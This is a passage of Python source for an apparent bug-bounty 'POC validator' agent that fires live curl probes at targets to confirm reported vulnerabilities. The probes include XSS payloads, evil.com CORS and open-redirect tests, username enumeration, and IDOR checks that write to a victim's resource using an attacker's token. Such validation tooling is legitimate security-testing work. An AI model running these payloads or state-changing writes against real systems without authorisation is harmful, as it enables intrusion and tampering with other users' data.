"""
POC Validator Agent

Independent finding validator that makes real HTTP requests to confirm or reject raw leads
from discovery agents. A finding without poc-validator CONFIRMED verdict is worthless.

CRITICAL (Task 6 - BountyHound v4): All authorization-related findings (IDOR, BOLA,
auth bypass, privilege escalation) MUST include state change verification to prevent
false positives like the Airbnb 2026-02-14 disaster.
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import time
import json
import subprocess
import ipaddress
import logging
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from colorama import Fore, Style
from engine.core.state_verifier import StateVerifier

logger = logging.getLogger(__name__)



class POCValidator:
    """Validates vulnerability findings with actual HTTP requests"""

    # Verdict types
    CONFIRMED = "CONFIRMED"
    FALSE_POSITIVE = "FALSE_POSITIVE"
    NEEDS_AUTH = "NEEDS_AUTH"
    NEEDS_BROWSER = "NEEDS_BROWSER_VERIFICATION"
    RATE_LIMITED = "RATE_LIMITED"

    def __init__(self, output_dir: Optional[str] = None):
        """
        Initialize POC Validator.

        Args:
            output_dir: Directory to store curl output files (default: C:/Users/vaugh/BountyHound/findings/tmp)
        """
        if output_dir is None:
            import os
            BOUNTY_DIR = os.environ.get('BOUNTYHOUND_DIR', os.path.expanduser('~/BountyHound'))
            output_dir = Path(BOUNTY_DIR) / "findings" / "tmp"

        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.validated_findings = []
        self._request_count = 0
        self.state_verifier = StateVerifier()  # Task 6: Prevent false positives

    def validate(self, finding: dict) -> dict:
        """
        Validate a finding with actual requests.

        Args:
            finding: Finding dictionary with keys:
                - finding_id: str
                - target_domain: str
                - url: str
                - vulnerability_type: str
                - claimed_behavior: str
                - claimed_severity: str
                - discovered_by: str (optional)

        Returns:
            dict: Validation result with verdict, evidence, and reasoning
        """
        finding_id = finding.get('finding_id', 'unknown')
        vuln_type = finding.get('vulnerability_type', '').lower()
        url = finding.get('url', '')
        domain = finding.get('target_domain', '')

        print(f"\n{Fore.CYAN}[*] Validating {finding_id}: {vuln_type}{Style.RESET_ALL}")

        # Step 1: DNS Resolution
        dns_result = self._check_dns(domain)
        if not dns_result['pass']:
            return self._build_verdict(
                finding_id=finding_id,
                verdict=self.FALSE_POSITIVE,
                vuln_type=vuln_type,
                url=url,
                steps={'DNS Resolution': dns_result},
                reason=dns_result['reason']
            )

        # Step 2: HTTP Reachability
        reachability_result = self._check_http_reachability(domain)
        if not reachability_result['pass']:
            return self._build_verdict(
                finding_id=finding_id,
                verdict=self.FALSE_POSITIVE,
                vuln_type=vuln_type,
                url=url,
                steps={
                    'DNS Resolution': dns_result,
                    'HTTP Reachability': reachability_result
                },
                reason=reachability_result['reason']
            )

        # Step 3: Endpoint Existence
        endpoint_result = self._check_endpoint_exists(url)
        if not endpoint_result['pass']:
            return self._build_verdict(
                finding_id=finding_id,
                verdict=self.FALSE_POSITIVE,
                vuln_type=vuln_type,
                url=url,
                steps={
                    'DNS Resolution': dns_result,
                    'HTTP Reachability': reachability_result,
                    'Endpoint Existence': endpoint_result
                },
                reason=endpoint_result['reason']
            )

        # Step 4: Vulnerability-Specific Proof
        vuln_result = self._validate_vulnerability_type(finding)

        all_steps = {
            'DNS Resolution': dns_result,
            'HTTP Reachability': reachability_result,
            'Endpoint Existence': endpoint_result,
            'Vulnerability Proof': vuln_result
        }

        verdict_type = self.CONFIRMED if vuln_result['pass'] else self.FALSE_POSITIVE
        reason = vuln_result.get('reason', 'Vulnerability confirmed' if vuln_result['pass'] else 'Could not confirm vulnerability')

        result = self._build_verdict(
            finding_id=finding_id,
            verdict=verdict_type,
            vuln_type=vuln_type,
            url=url,
            steps=all_steps,
            reason=reason
        )

        # Task 6: Propagate state_change_verified from vuln_result
        if 'state_change_verified' in vuln_result:
            result['state_change_verified'] = vuln_result['state_change_verified']

        self.validated_findings.append(result)
        return result

    def _check_dns(self, domain: str) -> dict:
        """Check if domain resolves in DNS"""
        try:
            result = subprocess.run(
                ['nslookup', domain],
                capture_output=True,
                text=True,
                timeout=10
            )

            output = result.stdout + result.stderr

            # Check for resolution failures
            if any(x in output.lower() for x in ['non-existent domain', 'nxdomain', "can't find"]):
                return {
                    'pass': False,
                    'reason': f"Domain {domain} does not resolve in DNS",
                    'evidence': output[:200]
                }

            # Check for successful resolution (has an address)
            if 'address' in output.lower() or 'addr' in output.lower():
                return {
                    'pass': True,
                    'reason': 'Domain resolves',
                    'evidence': output[:200]
                }

            return {
                'pass': False,
                'reason': f"Unable to verify DNS resolution for {domain}",
                'evidence': output[:200]
            }

        except subprocess.TimeoutExpired:
            return {
                'pass': False,
                'reason': 'DNS lookup timeout',
                'evidence': 'nslookup timed out after 10 seconds'
            }
        except Exception as e:
            return {
                'pass': False,
                'reason': f'DNS check error: {str(e)}',
                'evidence': str(e)
            }

    def _check_http_reachability(self, domain: str) -> dict:
        """Check if domain is reachable via HTTP"""
        url = f"https://{domain}"

        try:
            result = subprocess.run(
                ['curl', '-s', '-I', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            output = result.stdout

            # Check curl exit code
            if result.returncode == 6:
                return {
                    'pass': False,
                    'reason': f'Could not resolve host {domain}',
                    'evidence': 'curl exit code 6'
                }
            elif result.returncode == 7:
                return {
                    'pass': False,
                    'reason': f'Connection refused to {domain}',
                    'evidence': 'curl exit code 7'
                }
            elif result.returncode == 28:
                return {
                    'pass': False,
                    'reason': f'Connection timeout to {domain}',
                    'evidence': 'curl exit code 28'
                }

            # Check for WAF blocks
            if self._is_waf_block(output):
                # Note: WAF on base doesn't mean endpoint is blocked
                return {
                    'pass': True,
                    'reason': 'Base domain returns WAF block (will check specific endpoint)',
                    'evidence': output[:500],
                    'warning': 'WAF detected on base domain'
                }

            # Any HTTP response is considered reachable
            if 'HTTP' in output:
                return {
                    'pass': True,
                    'reason': 'Domain is reachable',
                    'evidence': output[:500]
                }

            return {
                'pass': False,
                'reason': f'No HTTP response from {domain}',
                'evidence': output[:500]
            }

        except subprocess.TimeoutExpired:
            return {
                'pass': False,
                'reason': 'HTTP request timeout',
                'evidence': 'curl timed out'
            }
        except Exception as e:
            return {
                'pass': False,
                'reason': f'HTTP check error: {str(e)}',
                'evidence': str(e)
            }

    def _check_endpoint_exists(self, url: str) -> dict:
        """Check if specific endpoint exists and returns meaningful content"""
        # Get status code
        try:
            status_result = subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )
            status_code = status_result.stdout.strip()

            # Get response body
            body_result = subprocess.run(
                ['curl', '-s', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )
            body = body_result.stdout

            # Save response to file
            self._save_curl_output(f'endpoint_check_{self._request_count}.txt', body)
            self._request_count += 1

            # Check status code
            if status_code == '404':
                return {
                    'pass': False,
                    'reason': f'Endpoint returns 404 Not Found',
                    'evidence': f'HTTP {status_code}'
                }
            elif status_code == '403' and self._is_waf_block(body):
                return {
                    'pass': False,
                    'reason': f'Endpoint blocked by WAF (HTTP 403)',
                    'evidence': body[:500]
                }
            elif status_code == '401':
                return {
                    'pass': False,
                    'reason': f'Endpoint requires authentication (HTTP 401)',
                    'evidence': f'HTTP {status_code}'
                }

            # Check for empty response
            if len(body.strip()) == 0:
                return {
                    'pass': False,
                    'reason': 'Endpoint returns empty response',
                    'evidence': 'Response body: 0 bytes'
                }

            # Check for SPA HTML when JSON is expected
            if 'json' in url.lower() or '/api/' in url.lower():
                if body.strip().startswith('<!DOCTYPE') or body.strip().startswith('<html'):
                    return {
                        'pass': False,
                        'reason': 'API endpoint returns HTML instead of JSON',
                        'evidence': body[:200]
                    }

            return {
                'pass': True,
                'reason': f'Endpoint exists (HTTP {status_code})',
                'evidence': f'Status: {status_code}, Body length: {len(body)} bytes'
            }

        except subprocess.TimeoutExpired:
            return {
                'pass': False,
                'reason': 'Endpoint request timeout',
                'evidence': 'curl timed out'
            }
        except Exception as e:
            return {
                'pass': False,
                'reason': f'Endpoint check error: {str(e)}',
                'evidence': str(e)
            }

    def _validate_vulnerability_type(self, finding: dict) -> dict:
        """Route to specific validation method based on vulnerability type"""
        vuln_type = finding.get('vulnerability_type', '').lower()

        validators = {
            'cors_misconfiguration': self.validate_cors,
            'cors': self.validate_cors,
            'open_redirect': self.validate_open_redirect,
            'redirect': self.validate_open_redirect,
            'graphql_introspection': self.validate_graphql_introspection,
            'introspection': self.validate_graphql_introspection,
            'information_disclosure': self.validate_info_disclosure,
            'disclosure': self.validate_info_disclosure,
            'idor': self.validate_idor,
            'bola': self.validate_idor,  # Task 6: BOLA uses same validation as IDOR
            'auth_bypass': self.validate_idor,  # Task 6: Auth bypass requires state change proof
            'privilege_escalation': self.validate_idor,  # Task 6: Privilege escalation requires state change proof
            'username_enumeration': self.validate_username_enum,
            'enumeration': self.validate_username_enum,
            'xss': self.validate_xss,
            'sqli': self.validate_sqli,
            'sql_injection': self.validate_sqli,
            'ssrf': self.validate_ssrf,
            'missing_headers': self.validate_security_headers,
            'security_headers': self.validate_security_headers,
            'server_disclosure': self.validate_server_disclosure,
            'tech_disclosure': self.validate_server_disclosure,
        }

        validator = validators.get(vuln_type)
        if validator:
            return validator(finding)
        else:
            return {
                'pass': False,
                'reason': f'No validator implemented for vulnerability type: {vuln_type}',
                'evidence': 'Unsupported vulnerability type'
            }

    def validate_cors(self, finding: dict) -> dict:
        """
        Validate CORS misconfiguration with exploitability grading.

        Severity levels:
        - CRITICAL: ACAO reflects arbitrary origin WITH Access-Control-Allow-Credentials: true
        - HIGH: ACAO reflects arbitrary origin WITH credentials (confirmed with second origin)
        - MEDIUM: ACAO: * without credentials (limited impact - no cookie-based attacks)
        - LOW: ACAO reflects but no credentials header
        - FALSE_POSITIVE: No reflection or proper whitelist
        """
        url = finding.get('url', '')

        try:
            # Test 1: Send evil.com origin
            result_evil = subprocess.run(
                ['curl', '-s', '-I', '-H', 'Origin: https://evil.com', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )
            headers_evil = result_evil.stdout.lower()
            self._save_curl_output(f'cors_evil_{self._request_count}.txt', result_evil.stdout)
            self._request_count += 1

            has_reflected_evil = 'access-control-allow-origin: https://evil.com' in headers_evil
            has_credentials = 'access-control-allow-credentials: true' in headers_evil
            has_wildcard = 'access-control-allow-origin: *' in headers_evil

            # Test 2: Send a second arbitrary origin to confirm it reflects ANY origin (not just a whitelist hit)
            result_second = subprocess.run(
                ['curl', '-s', '-I', '-H', 'Origin: https://attacker-12345.example.net', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )
            headers_second = result_second.stdout.lower()
            self._save_curl_output(f'cors_second_{self._request_count}.txt', result_second.stdout)
            self._request_count += 1

            has_reflected_second = 'access-control-allow-origin: https://attacker-12345.example.net' in headers_second
            has_credentials_second = 'access-control-allow-credentials: true' in headers_second

            # Both origins reflected = true arbitrary reflection (not a whitelist fluke)
            reflects_arbitrary = has_reflected_evil and has_reflected_second

            # CRITICAL: Arbitrary origin reflected WITH credentials on both probes
            if reflects_arbitrary and has_credentials and has_credentials_second:
                logger.info(f"CORS CRITICAL: {url} reflects arbitrary origin with credentials")
                return {
                    'pass': True,
                    'reason': 'CORS CRITICAL: arbitrary origin reflected with Access-Control-Allow-Credentials: true',
                    'evidence': result_evil.stdout[:500],
                    'severity': 'critical',
                    'exploitability': 'Attacker page can read authenticated API responses cross-origin via fetch({credentials: "include"})'
                }

            # HIGH: Only one origin reflected with credentials (possible partial whitelist bypass)
            if has_reflected_evil and has_credentials and not has_reflected_second:
                logger.info(f"CORS HIGH: {url} reflects evil.com with credentials but not second origin")
                return {
                    'pass': True,
                    'reason': 'CORS HIGH: origin reflected with credentials (may be partial whitelist bypass)',
                    'evidence': result_evil.stdout[:500],
                    'severity': 'high',
                    'exploitability': 'Test with subdomains of the target to confirm whitelist regex bypass'
                }

            # MEDIUM: Wildcard ACAO without credentials
            if has_wildcard and not has_credentials:
                logger.info(f"CORS MEDIUM: {url} has ACAO:* without credentials")
                return {
                    'pass': True,
                    'reason': 'CORS MEDIUM: Access-Control-Allow-Origin: * (no credentials). '
                              'Limited impact - browser will not send cookies cross-origin.',
                    'evidence': result_evil.stdout[:500],
                    'severity': 'medium',
                    'exploitability': 'Only unauthenticated data is readable cross-origin'
                }

            # Wildcard WITH credentials is a browser-rejected config (browsers block this)
            if has_wildcard and has_credentials:
                return {
                    'pass': False,
                    'reason': 'ACAO: * with credentials: true is rejected by browsers (spec violation)',
                    'evidence': result_evil.stdout[:500],
                    'severity': 'info'
                }

            # LOW: Reflects origin but no credentials header
            if reflects_arbitrary and not has_credentials:
                logger.info(f"CORS LOW: {url} reflects arbitrary origin but no credentials")
                return {
                    'pass': True,
                    'reason': 'CORS LOW: origin reflected without credentials. '
                              'Cross-origin reads possible but only for unauthenticated responses.',
                    'evidence': result_evil.stdout[:500],
                    'severity': 'low',
                    'exploitability': 'No cookie/session data exposed - limited to public data theft'
                }

            return {
                'pass': False,
                'reason': 'No CORS misconfiguration detected - origin not reflected',
                'evidence': result_evil.stdout[:500]
            }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'CORS validation error: {str(e)}',
                'evidence': str(e)
            }

    def validate_open_redirect(self, finding: dict) -> dict:
        """Validate open redirect vulnerability"""
        url = finding.get('url', '')
        param = finding.get('param', 'url')

        test_url = f"{url}{'&' if '?' in url else '?'}{param}=https://evil.com"

        try:
            result = subprocess.run(
                ['curl', '-s', '-I', '-m', '10', test_url],
                capture_output=True,
                text=True,
                timeout=15
            )

            output = result.stdout
            self._save_curl_output(f'redirect_check_{self._request_count}.txt', output)
            self._request_count += 1

            # Extract Location header
            location_match = re.search(r'location:\s*(.+)', output, re.IGNORECASE)
            if location_match:
                location = location_match.group(1).strip()

                if location.startswith('https://evil.com') or location.startswith('http://evil.com'):
                    return {
                        'pass': True,
                        'reason': 'Open redirect confirmed: redirects to external domain',
                        'evidence': f'Location: {location}'
                    }
                else:
                    return {
                        'pass': False,
                        'reason': f'Redirect stays on target domain or is sanitized',
                        'evidence': f'Location: {location}'
                    }
            else:
                return {
                    'pass': False,
                    'reason': 'No Location header found in response',
                    'evidence': output[:500]
                }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'Redirect validation error: {str(e)}',
                'evidence': str(e)
            }

    def validate_graphql_introspection(self, finding: dict) -> dict:
        """Validate GraphQL introspection is enabled"""
        url = finding.get('url', '')

        query = '{"query":"{ __schema { types { name } } }"}'

        try:
            result = subprocess.run(
                ['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json',
                 '-d', query, '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            output = result.stdout
            self._save_curl_output(f'graphql_introspection_{self._request_count}.txt', output)
            self._request_count += 1

            # Check if response is valid JSON
            try:
                data = json.loads(output)

                # Check for schema data
                if 'data' in data and '__schema' in data.get('data', {}):
                    types = data['data']['__schema'].get('types', [])
                    if types and len(types) > 0:
                        return {
                            'pass': True,
                            'reason': f'GraphQL introspection enabled: {len(types)} types discovered',
                            'evidence': f'Found types: {[t.get("name") for t in types[:5]]}'
                        }

                # Check for introspection disabled error
                if 'errors' in data:
                    errors = data['errors']
                    error_msg = str(errors)
                    if 'introspection' in error_msg.lower():
                        return {
                            'pass': False,
                            'reason': 'Introspection is disabled',
                            'evidence': error_msg
                        }

                return {
                    'pass': False,
                    'reason': 'No introspection data in response',
                    'evidence': output[:500]
                }

            except json.JSONDecodeError:
                return {
                    'pass': False,
                    'reason': 'Response is not valid JSON',
                    'evidence': output[:500]
                }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'GraphQL introspection validation error: {str(e)}',
                'evidence': str(e)
            }

    def validate_info_disclosure(self, finding: dict) -> dict:
        """Validate information disclosure"""
        url = finding.get('url', '')

        try:
            result = subprocess.run(
                ['curl', '-s', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            # Get status code
            status_result = subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            status_code = status_result.stdout.strip()
            body = result.stdout

            self._save_curl_output(f'info_disclosure_{self._request_count}.txt', body)
            self._request_count += 1

            # Must be HTTP 200 and have meaningful data
            if status_code != '200':
                return {
                    'pass': False,
                    'reason': f'Endpoint returns HTTP {status_code}, not 200',
                    'evidence': f'HTTP {status_code}'
                }

            # Check for authentication challenges
            if any(x in body.lower() for x in ['login', 'sign in', 'authenticate', 'unauthorized']):
                return {
                    'pass': False,
                    'reason': 'Endpoint returns authentication challenge',
                    'evidence': body[:500]
                }

            # Must have actual content
            if len(body.strip()) < 50:
                return {
                    'pass': False,
                    'reason': 'Response too small to contain meaningful data',
                    'evidence': f'Body length: {len(body)} bytes'
                }

            return {
                'pass': True,
                'reason': f'Endpoint returns data (HTTP 200, {len(body)} bytes)',
                'evidence': body[:500],
                'note': 'Verify data is actually sensitive and not publicly documented'
            }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'Info disclosure validation error: {str(e)}',
                'evidence': str(e)
            }

    def validate_idor(self, finding: dict) -> dict:
        """
        Validate IDOR vulnerability.

        CRITICAL (Task 6): IDOR findings MUST include state change verification to prevent
        false positives. HTTP 200 alone is NOT sufficient proof.
        """
        url = finding.get('url', '')
        token_a = finding.get('token_a', '')
        id_b = finding.get('id_b', '')

        if not token_a:
            return {
                'pass': False,
                'verdict': self.NEEDS_AUTH,
                'reason': 'IDOR testing requires authentication tokens',
                'evidence': 'No token_a provided'
            }

        if not id_b:
            return {
                'pass': False,
                'reason': 'IDOR testing requires victim ID (id_b)',
                'evidence': 'No id_b provided'
            }

        # Task 6: Check if finding already includes state change evidence
        if finding.get('state_change_verified'):
            # Finding already has state change proof - validate it
            try:
                before_state = json.loads(finding.get('before_state', '{}'))
                after_state = json.loads(finding.get('after_state', '{}'))
                mutation_response = json.loads(finding.get('mutation_response', '{}'))

                verification = self.state_verifier.verify_mutation(
                    before_state=before_state,
                    mutation_response=mutation_response,
                    after_state=after_state
                )

                if verification.changed:
                    return {
                        'pass': True,
                        'reason': f'IDOR confirmed with state change: {verification.reason}',
                        'evidence': json.dumps(verification.diff),
                        'state_change_verified': True
                    }
                else:
                    return {
                        'pass': False,
                        'reason': f'No state change detected: {verification.reason}',
                        'evidence': 'HTTP 200 alone is insufficient proof'
                    }
            except json.JSONDecodeError:
                pass  # Fall through to regular validation

        try:
            # Request victim's resource with attacker's token
            result = subprocess.run(
                ['curl', '-s', '-H', f'Authorization: {token_a}', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            # Get status code
            status_result = subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                 '-H', f'Authorization: {token_a}', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            status_code = status_result.stdout.strip()
            body = result.stdout

            self._save_curl_output(f'idor_check_{self._request_count}.txt', body)
            self._request_count += 1

            # Check for proper auth rejection
            if status_code in ['403', '401', '404']:
                return {
                    'pass': False,
                    'reason': f'Endpoint properly rejects unauthorized access (HTTP {status_code})',
                    'evidence': f'HTTP {status_code}'
                }

            # Task 6: HTTP 200 alone is NOT sufficient - attempt write access to prove state change
            if status_code == '200' and len(body) > 0:
                logger.info(f"IDOR read access confirmed (HTTP 200), attempting write verification")

                # Attempt PATCH/PUT to verify write access (state change proof)
                write_verified = False
                write_evidence = ""
                write_method = finding.get('write_method', 'PATCH')
                write_payload = finding.get('write_payload', '{"_bh_canary": "poc_test"}')
                write_content_type = finding.get('write_content_type', 'application/json')

                try:
                    # Step 1: Read current state (before)
                    before_result = subprocess.run(
                        ['curl', '-s', '-H', f'Authorization: {token_a}', '-m', '10', url],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    before_body = before_result.stdout

                    # Step 2: Attempt mutation (PATCH/PUT with attacker token on victim resource)
                    mutation_result = subprocess.run(
                        ['curl', '-s', '-X', write_method,
                         '-H', f'Authorization: {token_a}',
                         '-H', f'Content-Type: {write_content_type}',
                         '-d', write_payload,
                         '-w', '\n%{http_code}', '-m', '10', url],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    mutation_output = mutation_result.stdout
                    # Extract status code from the last line
                    mutation_lines = mutation_output.rsplit('\n', 1)
                    mutation_body = mutation_lines[0] if len(mutation_lines) > 1 else mutation_output
                    mutation_status = mutation_lines[-1].strip() if len(mutation_lines) > 1 else ''

                    self._save_curl_output(f'idor_mutation_{self._request_count}.txt', mutation_output)
                    self._request_count += 1

                    # Step 3: Read state again (after)
                    after_result = subprocess.run(
                        ['curl', '-s', '-H', f'Authorization: {token_a}', '-m', '10', url],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    after_body = after_result.stdout

                    # Step 4: Compare before vs after using StateVerifier
                    try:
                        before_state = json.loads(before_body)
                        after_state = json.loads(after_body)
                        mutation_response = json.loads(mutation_body) if mutation_body.strip().startswith('{') else {'raw': mutation_body[:500], 'status': mutation_status}

                        verification = self.state_verifier.verify_mutation(
                            before_state=before_state,
                            mutation_response=mutation_response,
                            after_state=after_state
                        )

                        if verification.changed:
                            write_verified = True
                            write_evidence = json.dumps(verification.diff)[:500]
                            logger.info(f"IDOR write access CONFIRMED - state changed: {verification.reason}")
                        else:
                            # Mutation HTTP 2xx but no state change = possible soft-fail
                            if mutation_status.startswith('2'):
                                write_evidence = f"Mutation returned HTTP {mutation_status} but no state change detected"
                            else:
                                write_evidence = f"Mutation returned HTTP {mutation_status} - write access denied"
                    except json.JSONDecodeError:
                        # Non-JSON responses - fall back to string comparison
                        if before_body != after_body:
                            write_verified = True
                            write_evidence = f"Response changed after {write_method} (before: {len(before_body)}B, after: {len(after_body)}B)"
                        elif mutation_status.startswith('2'):
                            write_evidence = f"{write_method} returned HTTP {mutation_status} but response unchanged"
                        else:
                            write_evidence = f"{write_method} returned HTTP {mutation_status}"

                except Exception as write_err:
                    write_evidence = f"Write verification error: {str(write_err)}"
                    logger.warning(f"IDOR write verification failed: {write_err}")

                if write_verified:
                    return {
                        'pass': True,
                        'reason': f'IDOR confirmed with state change proof: attacker can READ and WRITE victim data',
                        'evidence': f'Read: HTTP 200, Write: {write_evidence}',
                        'state_change_verified': True
                    }
                else:
                    # Read-only access confirmed but no write proof
                    return {
                        'pass': False,
                        'reason': 'IDOR read access observed (HTTP 200) but state change NOT verified. '
                                  'Provide write_method, write_payload, and write_content_type in finding for write test, '
                                  'or include before_state/after_state/mutation_response fields with pre-captured proof.',
                        'evidence': f'HTTP 200, body: {body[:300]}. Write attempt: {write_evidence}',
                        'note': 'Add state_change_verified=True with before_state/after_state/mutation_response to confirm',
                        'state_change_verified': False
                    }

            return {
                'pass': False,
                'reason': f'Unexpected response: HTTP {status_code}',
                'evidence': body[:500]
            }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'IDOR validation error: {str(e)}',
                'evidence': str(e)
            }

    def validate_username_enum(self, finding: dict) -> dict:
        """Validate username enumeration"""
        url = finding.get('url', '')
        valid_username = finding.get('valid_username', 'admin')

        try:
            # Test with valid username
            valid_result = subprocess.run(
                ['curl', '-s', '-X', 'POST', '-d', f'username={valid_username}', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            # Test with invalid username
            invalid_result = subprocess.run(
                ['curl', '-s', '-X', 'POST', '-d', 'username=definitely_not_real_xyzzy_12345', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            valid_output = valid_result.stdout
            invalid_output = invalid_result.stdout

            self._save_curl_output(f'enum_valid_{self._request_count}.txt', valid_output)
            self._save_curl_output(f'enum_invalid_{self._request_count}.txt', invalid_output)
            self._request_count += 1

            # Compare responses
            size_diff = abs(len(valid_output) - len(invalid_output))
            size_diff_pct = (size_diff / max(len(valid_output), 1)) * 100

            # Check for differences
            if valid_output != invalid_output:
                if size_diff_pct > 10:
                    return {
                        'pass': True,
                        'reason': f'Username enumeration confirmed: {size_diff_pct:.1f}% size difference',
                        'evidence': f'Valid: {len(valid_output)} bytes, Invalid: {len(invalid_output)} bytes'
                    }
                else:
                    # Content differs but sizes similar
                    return {
                        'pass': True,
                        'reason': 'Username enumeration confirmed: different response messages',
                        'evidence': f'Valid response differs from invalid response'
                    }
            else:
                return {
                    'pass': False,
                    'reason': 'No enumeration: identical responses for valid and invalid usernames',
                    'evidence': 'Responses are identical'
                }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'Username enumeration validation error: {str(e)}',
                'evidence': str(e)
            }

    def validate_xss(self, finding: dict) -> dict:
        """
        Validate XSS vulnerability with context-aware analysis.

        Checks:
        1. Content-Type must be text/html (XSS is not exploitable in application/json, text/plain, etc.)
        2. Payload must appear UNESCAPED in the response body
        3. Determines injection context: HTML body, attribute, script tag, or comment
        4. Tests multiple payloads for different contexts
        """
        url = finding.get('url', '')
        param = finding.get('param', 'q')

        # Context-specific payloads with unique markers for detection
        payloads = {
            'html_body': {
                'inject': '<img src=x onerror=alert(1)>',
                'check_unescaped': '<img src=x onerror=alert(1)>',
                'check_escaped': ['&lt;img', '&#60;img'],
            },
            'script_tag': {
                'inject': 'bhxss";alert(1)//',
                'check_unescaped': 'bhxss";alert(1)//',
                'check_escaped': ['bhxss&quot;', 'bhxss&#34;'],
            },
            'attribute': {
                'inject': '" onfocus=alert(1) autofocus="',
                'check_unescaped': '" onfocus=alert(1)',
                'check_escaped': ['&quot; onfocus', '&#34; onfocus'],
            },
        }

        # Also test the classic payload from the finding if provided
        custom_payload = finding.get('payload', '<script>alert(1)</script>')

        try:
            # First: check Content-Type with a baseline request
            headers_result = subprocess.run(
                ['curl', '-s', '-I', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )
            content_type = ''
            for line in headers_result.stdout.split('\n'):
                if line.lower().startswith('content-type:'):
                    content_type = line.lower().strip()
                    break

            # XSS requires text/html (or text/xml, application/xhtml+xml)
            html_types = ['text/html', 'application/xhtml+xml', 'text/xml', 'application/xml']
            is_html_context = any(ht in content_type for ht in html_types)

            if not is_html_context and content_type:
                # Content-Type is explicitly non-HTML - XSS not exploitable
                logger.info(f"XSS rejected: Content-Type is {content_type}, not HTML")
                return {
                    'pass': False,
                    'reason': f'XSS not exploitable: Content-Type is {content_type}. '
                              'XSS requires text/html or similar to execute scripts.',
                    'evidence': f'Content-Type: {content_type}'
                }

            # Test custom payload first
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={custom_payload}"
            result = subprocess.run(
                ['curl', '-s', '-m', '10', test_url],
                capture_output=True,
                text=True,
                timeout=15
            )
            output = result.stdout
            self._save_curl_output(f'xss_check_{self._request_count}.txt', output)
            self._request_count += 1

            # Check if custom payload appears unescaped
            if custom_payload in output:
                context = self._detect_xss_context(output, custom_payload)
                logger.info(f"XSS confirmed with custom payload in {context} context")
                return {
                    'pass': True,
                    'reason': f'XSS confirmed: payload reflected UNESCAPED in {context} context',
                    'evidence': output[:500],
                    'context': context,
                    'payload': custom_payload,
                    'verdict': self.CONFIRMED
                }

            # Check if custom payload was encoded
            encoded_indicators = ['&lt;', '&gt;', '&quot;', '&#39;', '&amp;', '%3C', '%3E', '%22']
            custom_was_encoded = any(enc in output for enc in encoded_indicators)

            # Try context-specific payloads
            for ctx_name, ctx_data in payloads.items():
                ctx_url = f"{url}{'&' if '?' in url else '?'}{param}={ctx_data['inject']}"
                ctx_result = subprocess.run(
                    ['curl', '-s', '-m', '10', ctx_url],
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                ctx_output = ctx_result.stdout
                self._save_curl_output(f'xss_{ctx_name}_{self._request_count}.txt', ctx_output)
                self._request_count += 1

                # Check unescaped
                if ctx_data['check_unescaped'] in ctx_output:
                    context = self._detect_xss_context(ctx_output, ctx_data['check_unescaped'])
                    logger.info(f"XSS confirmed with {ctx_name} payload in {context} context")
                    return {
                        'pass': True,
                        'reason': f'XSS confirmed: {ctx_name} payload reflected UNESCAPED in {context} context',
                        'evidence': ctx_output[:500],
                        'context': context,
                        'payload': ctx_data['inject'],
                        'verdict': self.CONFIRMED
                    }

                # Check if this one was escaped
                if any(esc in ctx_output for esc in ctx_data['check_escaped']):
                    continue  # Encoded - try next payload

            # All payloads were either encoded or not reflected
            if custom_was_encoded:
                return {
                    'pass': False,
                    'reason': 'Payload is HTML-encoded in response (output encoding in place)',
                    'evidence': f'Encoded indicators found in response. Payload: {custom_payload}'
                }

            return {
                'pass': False,
                'reason': 'Payload does not appear in response (not reflected)',
                'evidence': output[:500]
            }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'XSS validation error: {str(e)}',
                'evidence': str(e)
            }

    def _detect_xss_context(self, html: str, payload: str) -> str:
        """Determine the injection context where the payload landed."""
        idx = html.find(payload)
        if idx == -1:
            return 'unknown'

        # Look at the 200 chars before the payload for context clues
        prefix = html[max(0, idx - 200):idx].lower()

        # Inside a <script> tag?
        last_script_open = prefix.rfind('<script')
        last_script_close = prefix.rfind('</script')
        if last_script_open > last_script_close:
            return 'script_tag'

        # Inside an HTML attribute? (look for an unclosed quote)
        # Find the last tag opening
        last_tag_open = prefix.rfind('<')
        last_tag_close = prefix.rfind('>')
        if last_tag_open > last_tag_close:
            # We're inside a tag - check if inside an attribute value
            tag_content = prefix[last_tag_open:]
            # Count quotes to see if we're inside an attribute value
            single_quotes = tag_content.count("'")
            double_quotes = tag_content.count('"')
            if single_quotes % 2 == 1 or double_quotes % 2 == 1:
                return 'attribute_value'
            return 'tag_body'

        # Inside an HTML comment?
